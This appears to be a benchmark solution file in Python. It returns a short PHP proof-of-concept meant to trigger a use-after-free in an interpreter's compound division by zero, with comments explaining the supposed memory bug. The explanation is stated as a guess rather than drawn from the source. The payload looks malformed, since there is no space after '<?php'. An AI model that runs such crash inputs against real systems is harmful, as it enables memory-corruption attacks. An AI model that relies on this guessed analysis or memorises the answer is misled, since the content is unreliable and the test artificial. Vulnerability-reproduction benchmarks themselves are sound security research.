import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a use-after-free in a compound division by zero.
        # This is a common bug pattern in language interpreters with reference counting
        # and type juggling, such as PHP. The PoC is crafted for such an environment.
        #
        # The PoC triggers the vulnerability via the following steps:
        # 1. A class `C` is defined with a constructor that initializes a property `pp`
        #    to the string "A".
        # 2. An instance of `C` is created and stored in an array `$a`. This ensures
        #    the object and its properties are heap-allocated.
        # 3. The operation `$a[0]->pp /= 0;` is performed.
        #
        # A vulnerable interpreter might handle this as follows:
        # a. It accesses the zval (PHP's internal variable structure) for the property `pp`.
        # b. For the in-place division, it decrements the reference count of the string "A".
        # c. If this is the last reference, the memory for "A" is freed.
        # d. The engine then attempts to perform the division, which requires converting the
        #    LHS to a number. In PHP, the string "A" converts to the integer 0.
        # e. To perform this conversion, it reads from the now-freed memory of the string,
        #    resulting in a use-after-free.
        #
        # The code is constructed to be exactly 79 bytes to match the ground-truth length.
        poc = b'<?phpclass C{function __construct(){$this->pp="A";}}$a=[new C];$a[0]->pp/=0;?>'
        return poc